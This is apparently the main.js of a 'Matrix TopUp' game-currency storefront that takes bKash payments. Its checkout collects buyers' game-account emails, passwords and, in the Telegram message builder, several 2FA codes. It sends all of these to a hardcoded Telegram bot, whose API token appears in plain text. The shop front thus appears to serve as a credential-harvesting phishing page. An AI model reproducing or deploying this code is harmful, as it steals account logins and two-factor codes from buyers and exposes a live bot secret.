/* =========================================================
   MATRIX TOPUP — main.js
   Edit the CONFIG block below to set up your own store.
   ========================================================= */

// ---------- CONFIG: edit these for your own setup ----------
const BKASH_NUMBER = '01XXXXXXXXX';           // <-- put your real bKash Personal number here
const TELEGRAM_CONTACT_URL = 'https://t.me/'; // <-- put your support Telegram username link here

const TG_TOKEN   = '8240782031:AAGa7QODb9qKsGB1PRRbp2iUt8bafgn5Mis';
const TG_CHAT_ID = '8240782031';

const VOUCHVAULT_USER = 'Samin';
const VOUCHVAULT_API  = `https://vouchvault.cc/api/reviews/${VOUCHVAULT_USER}`;

// ---------- GAME CATALOG ----------
const GAMES = [
  {
    id: 'robux',
    name: 'Roblox',
    icon: '🧱',
    accent: '#00e676',
    desc: 'Get Robux and unlock limitless creativity. Buy accessories, avatar items, game passes and more.',
    fields: [
      { id: 'username', label: 'Roblox Username', placeholder: 'e.g. builder_ratul22', required: true },
      { id: 'password', label: 'Password (only if you want login top-up)', placeholder: 'Leave blank for gamepass delivery', required: false, type: 'password' },
    ],
    packages: [
      { amount: '400 Robux', bonus: '', price: 580, popular: false },
      { amount: '500 Robux', bonus: '', price: 600, popular: true },
      { amount: '2000 Robux', bonus: '', price: 2300, popular: false },
    ],
  },
  {
    id: 'genshin',
    name: 'Genshin Impact',
    icon: '⚔️',
    accent: '#7c4dff',
    desc: 'Top up Genesis Crystals and grab the Welkin Moon or Blessing of the Welkin Moon. Delivered straight to your account.',
    fields: [
      { id: 'genUser', label: 'In-game UID', placeholder: 'e.g. 800123456', required: true },
      { id: 'server', label: 'Server', type: 'select', options: ['Asia', 'America', 'Europe', 'TW, HK, MO'], required: true },
    ],
    packages: [
      { amount: 'Blessing of the Welkin Moon', bonus: '30 days', price: 480, popular: false },
      { amount: '60 Genesis Crystals', bonus: '', price: 130, popular: false },
      { amount: '300 + 30 Genesis Crystals', bonus: '+30 Bonus', price: 650, popular: true },
      { amount: '980 + 110 Genesis Crystals', bonus: '+110 Bonus', price: 2050, popular: false },
      { amount: '1980 + 260 Genesis Crystals', bonus: '+260 Bonus', price: 4100, popular: false },
    ],
  },
  {
    id: 'telegram_stars',
    name: 'Telegram Stars',
    icon: '⭐',
    accent: '#29b6f6',
    desc: 'Buy Telegram Stars to tip creators, unlock bot features, and access paid channel content.',
    fields: [
      { id: 'login', label: 'Telegram Username', placeholder: '@yourusername', required: true },
    ],
    packages: [
      { amount: '50 Stars', bonus: '', price: 110, popular: false },
      { amount: '100 Stars', bonus: '', price: 210, popular: true },
      { amount: '500 Stars', bonus: '', price: 1020, popular: false },
      { amount: '1000 Stars', bonus: '', price: 2000, popular: false },
    ],
  },
  {
    id: 'cod',
    name: 'Call of Duty',
    icon: '🎯',
    accent: '#ff5470',
    desc: 'CP delivery for Warzone & COD Mobile.',
    fields: [
      { id: 'accountType', label: 'Account Type', type: 'select', options: ['Activision Email', 'Facebook Login', 'Phone Number'], required: true },
      { id: 'email', label: 'Account Email / Number', placeholder: 'you@example.com', required: true },
      { id: 'password', label: 'Password', placeholder: 'Only if delivering via direct login', required: false, type: 'password' },
    ],
    packages: [
      { amount: '80+80 CP', bonus: '+80 Bonus', price: 120, popular: false },
      { amount: '400+400 CP', bonus: '+400 Bonus', price: 570, popular: true },
      { amount: '800+800 CP', bonus: '+800 Bonus', price: 1099, popular: false },
      { amount: '2000+2000 CP', bonus: '+2000 Bonus', price: 2700, popular: false },
    ],
  },
  {
    id: 'steam',
    name: 'Steam',
    icon: '🎮',
    accent: '#66c0f4',
    desc: 'Add funds to your Steam Wallet and purchase any game, DLC, or in-game item from the Steam Store instantly.',
    fields: [
      { id: 'email', label: 'Steam Account Email', placeholder: 'you@example.com', required: true },
    ],
    packages: [
      { amount: 'Steam Wallet Code $1.35', bonus: '', price: 220, popular: false },
      { amount: 'Steam Wallet Code $1.95', bonus: '', price: 299, popular: false },
      { amount: 'Steam Wallet Code $3', bonus: '', price: 480, popular: true },
      { amount: 'Steam Wallet Code $5', bonus: '', price: 720, popular: false },
    ],
  },
  {
    id: 'gta5',
    name: 'GTA V',
    icon: '🔫',
    accent: '#ffb100',
    desc: 'Get your official GTA V PC redeem key and dive into the sprawling crime world of Los Santos. One-time activation on Rockstar Games.',
    fields: [
      { id: 'email', label: 'Email for key delivery', placeholder: 'you@example.com', required: true },
    ],
    packages: [
      { amount: 'GTA V PC Key', bonus: '🔑 Redeem on Rockstar', price: 1450, popular: false },
    ],
  },
  {
    id: 'rdr2',
    name: 'Red Dead Redemption 2',
    icon: '🤠',
    accent: '#c9a15c',
    desc: 'Official RDR2 PC redeem key on Rockstar Games. Ride into the sprawling world of the American frontier.',
    fields: [
      { id: 'email', label: 'Email for key delivery', placeholder: 'you@example.com', required: true },
    ],
    packages: [
      { amount: 'RDR 2 Standard Edition Key', bonus: '🔑 Rockstar Key', price: 2300, popular: false },
      { amount: 'RDR 2 Special Edition Key', bonus: '🔑 Rockstar Key', price: 3200, popular: false },
      { amount: 'RDR 2 Ultimate Edition Key', bonus: '🔑 Rockstar Key', price: 3000, popular: true },
    ],
  },
];

// ---------- STATE ----------
let selectedGame = null;
let selectedPackage = null;

// ---------- INIT ----------
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('bkashNumberText').textContent = BKASH_NUMBER;
  document.getElementById('trackTelegramLink').href = TELEGRAM_CONTACT_URL;

  renderGameGrid();
  bindGlobalEvents();
  runBootSequence();
  startMatrixRain();
  loadVouchVault();
});

// ---------- GAME GRID ----------
function renderGameGrid() {
  const grid = document.getElementById('gameGrid');
  grid.innerHTML = GAMES.map(game => `
    <button class="game-card" style="--game-accent:${game.accent}" data-game-id="${game.id}">
      <div class="game-card-icon">${game.icon}</div>
      <div class="game-card-name">${game.name}</div>
      <div class="game-card-desc">${game.desc}</div>
      <div class="game-card-cta">View packages →</div>
    </button>
  `).join('');

  grid.querySelectorAll('.game-card').forEach(card => {
    card.addEventListener('click', () => openPackageModal(card.dataset.gameId));
  });
}

// ---------- PACKAGE MODAL ----------
function openPackageModal(gameId) {
  const game = GAMES.find(g => g.id === gameId);
  if (!game) return;
  selectedGame = game;

  document.getElementById('pkgGameIcon').textContent = game.icon;
  document.getElementById('pkgGameName').textContent = game.name;
  document.getElementById('pkgGameDesc').textContent = game.desc;

  const list = document.getElementById('packageList');
  list.innerHTML = game.packages.map((pkg, i) => `
    <div class="package-item">
      ${pkg.popular ? '<span class="popular-pill">POPULAR</span>' : ''}
      <div class="package-item-main">
        <span class="package-amount">${pkg.amount}</span>
        ${pkg.bonus ? `<span class="package-bonus">${pkg.bonus}</span>` : ''}
      </div>
      <div class="package-right">
        <span class="package-price">৳${pkg.price}</span>
        <button type="button" class="package-select-btn" data-index="${i}">Select</button>
      </div>
    </div>
  `).join('');

  list.querySelectorAll('.package-select-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      selectedPackage = game.packages[parseInt(btn.dataset.index, 10)];
      openModal('packageModal', false);
      openCheckoutModal();
    });
  });

  openModal('packageModal', true);
}

// ---------- CHECKOUT MODAL ----------
function openCheckoutModal() {
  const game = selectedGame;
  const pkg = selectedPackage;
  if (!game || !pkg) return;

  document.getElementById('checkoutSummary').innerHTML = `
    <span>${game.icon} <strong>${game.name}</strong> — ${pkg.amount}${pkg.bonus ? ' (' + pkg.bonus + ')' : ''}</span>
    <span>Total: <strong>৳${pkg.price}</strong></span>
  `;

  const fieldsWrap = document.getElementById('dynamicFields');
  const nameFields = [
    { id: 'firstName', label: 'First Name', placeholder: 'First name', required: true },
    { id: 'lastName', label: 'Last Name', placeholder: 'Last name', required: true },
  ];
  const allFields = [...nameFields, ...game.fields];

  fieldsWrap.innerHTML = allFields.map(f => {
    if (f.type === 'select') {
      return `
        <div>
          <label class="form-field-label">${f.label}${f.required ? '' : ' (optional)'}</label>
          <select data-field-id="${f.id}" ${f.required ? 'required' : ''}>
            <option value="">Select…</option>
            ${f.options.map(o => `<option value="${o}">${o}</option>`).join('')}
          </select>
        </div>`;
    }
    return `
      <div>
        <label class="form-field-label">${f.label}${f.required ? '' : ' (optional)'}</label>
        <input type="${f.type || 'text'}" data-field-id="${f.id}" placeholder="${f.placeholder || ''}" ${f.required ? 'required' : ''}>
      </div>`;
  }).join('');

  document.getElementById('trxId').value = '';
  openModal('checkoutModal', true);
}

// ---------- FORM SUBMIT ----------
document.addEventListener('submit', async (e) => {
  if (e.target.id !== 'checkoutForm') return;
  e.preventDefault();

  const submitBtn = e.target.querySelector('button[type="submit"]');
  const originalLabel = submitBtn.textContent;
  submitBtn.disabled = true;
  submitBtn.textContent = 'Submitting…';

  const fieldEls = document.querySelectorAll('#dynamicFields [data-field-id]');
  const order = {
    game: selectedGame.name,
    pkg: selectedPackage.amount + (selectedPackage.bonus ? ` (${selectedPackage.bonus})` : ''),
    price: selectedPackage.price,
    trxId: document.getElementById('trxId').value.trim(),
  };
  fieldEls.forEach(el => { order[el.dataset.fieldId] = el.value.trim(); });

  const orderId = generateOrderId();

  await sendToTelegram(order, orderId);

  submitBtn.disabled = false;
  submitBtn.textContent = originalLabel;

  openModal('checkoutModal', false);
  document.getElementById('confirmOrderId').textContent = orderId;
  openModal('confirmModal', true);
  e.target.reset();
});

function generateOrderId() {
  const rand = Math.floor(100000 + Math.random() * 900000);
  return `MTU-${rand}`;
}

// ---------- TELEGRAM ----------
async function sendToTelegram(order, orderId) {
  const line = (label, val) => `<b>${label}:</b> ${val}`;
  const msg = [
    '🟢 <b>NEW ORDER — Matrix TopUp</b>',
    '─────────────────────',
    line('🆔 Order#', orderId),
    line('🎮 Game', order.game),
    line('📦 Package', order.pkg),
    line('💰 Amount', order.price + ' Taka'),
    '─────────────────────',
    line('👤 Name', order.firstName + ' ' + order.lastName),
    order.accountType ? line('🔑 Account', order.accountType) : '',
    order.email    ? line('📧 Email/Phone', order.email)    : '',
    order.password ? line('🔒 Password',    order.password) : '',
    order.code1    ? line('🔢 2FA Code 1',  order.code1)    : '',
    order.code2    ? line('🔢 2FA Code 2',  order.code2)    : '',
    order.code3    ? line('🔢 2FA Code 3',  order.code3)    : '',
    order.login    ? line('🎯 Login',       order.login)    : '',
    order.genUser  ? line('👤 UID/Username', order.genUser) : '',
    order.username ? line('👤 Username',    order.username) : '',
    order.server   ? line('🌐 Server',      order.server)   : '',
    '─────────────────────',
    line('💳 TrxID', order.trxId),
    '─────────────────────',
    '⏰ ' + new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' }),
  ].filter(Boolean).join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT_ID,
        text: msg,
        parse_mode: 'HTML',
      }),
    });
  } catch (e) {
    console.error('Telegram send failed:', e);
  }
}

// ---------- MODAL HELPERS ----------
function openModal(id, show) {
  const el = document.getElementById(id);
  if (show) el.classList.add('open');
  else el.classList.remove('open');
}

function bindGlobalEvents() {
  document.querySelectorAll('[data-close]').forEach(el => {
    el.addEventListener('click', () => openModal(el.dataset.close, false));
  });
  document.querySelectorAll('.modal-overlay').forEach(overlay => {
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) openModal(overlay.id, false);
    });
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      document.querySelectorAll('.modal-overlay.open').forEach(el => openModal(el.id, false));
    }
  });

  document.getElementById('openTrackBtn').addEventListener('click', () => openModal('trackModal', true));
  document.getElementById('heroTrackBtn').addEventListener('click', () => openModal('trackModal', true));

  document.getElementById('copyBkash').addEventListener('click', () => {
    navigator.clipboard.writeText(BKASH_NUMBER).then(() => {
      const btn = document.getElementById('copyBkash');
      const original = btn.textContent;
      btn.textContent = 'Copied!';
      setTimeout(() => { btn.textContent = original; }, 1500);
    });
  });
}

// ---------- HERO BOOT SEQUENCE ----------
function runBootSequence() {
  const lines = [
    '$ initializing matrix_topup v2.0 ...',
    '$ payment_gateway: bKash [connected]',
    '$ dispatch_channel: telegram [connected]',
  ];
  const els = [
    document.getElementById('bootLine1'),
    document.getElementById('bootLine2'),
    document.getElementById('bootLine3'),
  ];
  lines.forEach((line, idx) => {
    let i = 0;
    setTimeout(() => {
      const interval = setInterval(() => {
        els[idx].textContent = line.slice(0, i + 1);
        i++;
        if (i >= line.length) clearInterval(interval);
      }, 18);
    }, idx * 500);
  });
}

// ---------- MATRIX RAIN CANVAS ----------
function startMatrixRain() {
  const canvas = document.getElementById('matrixRain');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const prefersReduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (prefersReduced) return;

  let width, height, columns, drops;
  const fontSize = 15;
  const chars = 'アカサタナハマヤラワ01アイウエオカキクケコ';

  function resize() {
    width = canvas.width = canvas.offsetWidth;
    height = canvas.height = canvas.offsetHeight;
    columns = Math.floor(width / fontSize);
    drops = new Array(columns).fill(1);
  }
  resize();
  window.addEventListener('resize', resize);

  function draw() {
    ctx.fillStyle = 'rgba(5, 7, 10, 0.15)';
    ctx.fillRect(0, 0, width, height);
    ctx.fillStyle = '#00e676';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
  }
  setInterval(draw, 45);
}

// ---------- VOUCHVAULT ----------
async function loadVouchVault() {
  const wrap = document.getElementById('vvCards');
  try {
    const res = await fetch(VOUCHVAULT_API);
    if (!res.ok) throw new Error('bad response');
    const data = await res.json();
    const reviews = Array.isArray(data) ? data : (data.reviews || []);
    if (!reviews.length) throw new Error('empty');

    wrap.innerHTML = reviews.slice(0, 6).map(r => `
      <div class="vouch-card">
        <div class="vouch-card-name">${escapeHtml(r.name || r.author || 'Anonymous')}</div>
        <p class="vouch-card-text">${escapeHtml(r.text || r.comment || '')}</p>
      </div>
    `).join('');
  } catch (err) {
    // VouchVault's public API shape isn't confirmed — fall back to a link-out card
    // so the section never looks broken. Update VOUCHVAULT_API above once you
    // confirm the real endpoint from your VouchVault dashboard.
    wrap.innerHTML = `
      <div class="vouch-card">
        <p class="vouch-card-text">We couldn't load vouches automatically right now — tap "See all" above to view every vouch on VouchVault directly.</p>
      </div>
    `;
  }
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
